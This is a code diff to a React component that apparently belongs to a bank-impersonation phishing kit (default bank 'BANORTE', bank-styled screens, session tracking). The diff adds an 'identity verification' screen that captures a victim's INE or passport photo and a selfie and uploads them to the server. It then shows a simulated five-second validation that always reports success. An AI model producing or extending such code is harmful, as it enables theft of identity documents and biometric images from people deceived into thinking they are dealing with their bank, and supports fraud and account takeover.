@@ -49,13 +49,15 @@ interface ScreenTemplatesProps {
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
+  sessionId?: string;
 }
 
 export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
   currentScreen, 
   screenData,
   onSubmit,
-  banco = "BANORTE"
+  banco = "BANORTE",
+  sessionId = ""
 }) => {
   // Normalizar el banco a mayúsculas para consistencia
   const bankCode = banco.toUpperCase();
@@ -73,6 +75,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [passwordError, setPasswordError] = useState<string | null>(null);
   const [qrScanned, setQrScanned] = useState<string | null>(null);
   const [qrImageData, setQrImageData] = useState<string | null>(null);
+  
+  // Estados para verificación de identidad
+  const [documentType, setDocumentType] = useState("");
+  const [currentStep, setCurrentStep] = useState<'select' | 'document' | 'selfie' | 'validating' | 'success'>('select');
+  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
+  const [canvasRef, setCanvasRef] = useState<HTMLCanvasElement | null>(null);
+  const [selfieVideoRef, setSelfieVideoRef] = useState<HTMLVideoElement | null>(null);
+  const [selfieCanvasRef, setSelfieCanvasRef] = useState<HTMLCanvasElement | null>(null);
+  const [documentImage, setDocumentImage] = useState<string | null>(null);
+  const [selfieImage, setSelfieImage] = useState<string | null>(null);
+  const [isUploading, setIsUploading] = useState(false);
   
   // Estados para protección de saldo
   const [debitoSelect, setDebitoSelect] = useState('');
@@ -895,6 +908,203 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(proteccionSaldoContent);
+
+      case ScreenType.VERIFICACION_ID:
+
+        const startCamera = async () => {
+          if (!documentType) {
+            alert('Por favor, selecciona un tipo de documento.');
+            return;
+          }
+          setCurrentStep('document');
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if (videoRef) {
+              videoRef.srcObject = stream;
+            }
+          } catch (err) {
+            alert('No se pudo acceder a la cámara: ' + err);
+          }
+        };
+
+        const captureDocument = async () => {
+          if (!videoRef || !canvasRef) return;
+          
+          canvasRef.width = videoRef.videoWidth;
+          canvasRef.height = videoRef.videoHeight;
+          const context = canvasRef.getContext('2d');
+          if (context) {
+            context.drawImage(videoRef, 0, 0);
+            const docImage = canvasRef.toDataURL('image/png');
+            setDocumentImage(docImage);
+            
+            // Detener cámara del documento
+            const tracks = (videoRef.srcObject as MediaStream)?.getTracks();
+            tracks?.forEach(track => track.stop());
+            
+            // Mostrar cámara para selfie
+            setCurrentStep('selfie');
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+              if (selfieVideoRef) {
+                selfieVideoRef.srcObject = stream;
+              }
+            } catch (err) {
+              alert('No se pudo acceder a la cámara para selfie: ' + err);
+            }
+          }
+        };
+
+        const captureSelfie = async () => {
+          if (!selfieVideoRef || !selfieCanvasRef) return;
+          
+          selfieCanvasRef.width = selfieVideoRef.videoWidth;
+          selfieCanvasRef.height = selfieVideoRef.videoHeight;
+          const context = selfieCanvasRef.getContext('2d');
+          if (context) {
+            context.drawImage(selfieVideoRef, 0, 0);
+            const selfie = selfieCanvasRef.toDataURL('image/png');
+            setSelfieImage(selfie);
+            
+            // Detener cámara de selfie
+            const tracks = (selfieVideoRef.srcObject as MediaStream)?.getTracks();
+            tracks?.forEach(track => track.stop());
+            
+            // Subir archivos y mostrar validación
+            await uploadIdentityFiles(documentImage, selfie);
+          }
+        };
+
+        const uploadIdentityFiles = async (docImage: string | null, selfie: string | null) => {
+          if (!docImage || !selfie) return;
+          
+          setCurrentStep('validating');
+          setIsUploading(true);
+          
+          try {
+            // Convertir base64 a blob
+            const docBlob = await fetch(docImage).then(r => r.blob());
+            const selfieBlob = await fetch(selfie).then(r => r.blob());
+            
+            const formData = new FormData();
+            formData.append('documentFile', docBlob, `documento_${documentType}.png`);
+            formData.append('selfieFile', selfieBlob, 'selfie.png');
+            formData.append('documentType', documentType);
+            formData.append('sessionId', sessionId);
+
+            const response = await fetch('/api/upload-identity-files', {
+              method: 'POST',
+              credentials: 'include',
+              body: formData
+            });
+
+            if (!response.ok) {
+              throw new Error('Error al subir los archivos');
+            }
+
+            // Simular validación por 5 segundos
+            setTimeout(() => {
+              setCurrentStep('success');
+              onSubmit(ScreenType.VERIFICACION_ID, {
+                documentType,
+                documentUploaded: true,
+                selfieUploaded: true,
+                verified: true
+              });
+            }, 5000);
+
+          } catch (error) {
+            console.error('Error uploading identity files:', error);
+            alert('Error al subir los archivos. Inténtalo de nuevo.');
+            setCurrentStep('select');
+          } finally {
+            setIsUploading(false);
+          }
+        };
+
+        const verificacionIdContent = (
+          <>
+            <h1 className="text-xl font-bold mb-4">Validación de Identidad</h1>
+            
+            <div className="bg-gray-100 border border-gray-300 p-4 mb-5 rounded">
+              <strong>Para tu seguridad:</strong> Necesitamos verificar tu identidad. Toma una foto de tu documento y una selfie para confirmar que eres tú y proteger tu cuenta.
+            </div>
+
+            {currentStep === 'select' && (
+              <>
+                <p className="mb-4">Selecciona el tipo de documento:</p>
+                <select 
+                  value={documentType}
+                  onChange={(e) => setDocumentType(e.target.value)}
+                  className="w-full p-2 border border-gray-300 rounded mb-4"
+                >
+                  <option value="">--Selecciona--</option>
+                  <option value="ine">INE</option>
+                  <option value="pasaporte">Pasaporte</option>
+                </select>
+                <Button 
+                  className={primaryBtnClass}
+                  onClick={startCamera}
+                >
+                  Subir Documento
+                </Button>
+              </>
+            )}
+
+            {currentStep === 'document' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4">Captura tu documento</h2>
+                <video 
+                  ref={setVideoRef}
+                  autoPlay 
+                  className="w-full max-w-md border-2 border-gray-800 mb-4"
+                />
+                <canvas ref={setCanvasRef} style={{ display: 'none' }} />
+                <br />
+                <Button 
+                  className={primaryBtnClass}
+                  onClick={captureDocument}
+                >
+                  Capturar Documento
+                </Button>
+              </div>
+            )}
+
+            {currentStep === 'selfie' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4">Ahora toma tu selfie</h2>
+                <video 
+                  ref={setSelfieVideoRef}
+                  autoPlay 
+                  className="w-full max-w-md border-2 border-gray-800 mb-4"
+                />
+                <canvas ref={setSelfieCanvasRef} style={{ display: 'none' }} />
+                <br />
+                <Button 
+                  className={primaryBtnClass}
+                  onClick={captureSelfie}
+                >
+                  Capturar Selfie
+                </Button>
+              </div>
+            )}
+
+            {currentStep === 'validating' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4">Validando información...</h2>
+                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
+              </div>
+            )}
+
+            {currentStep === 'success' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4 text-green-600">Validación con éxito ✅</h2>
+                <p>Tu identidad ha sido verificada correctamente.</p>
+              </div>
+            )}
+          </>
+        );
+        return getBankContainer(verificacionIdContent);
 
       default:
         const defaultContent = (
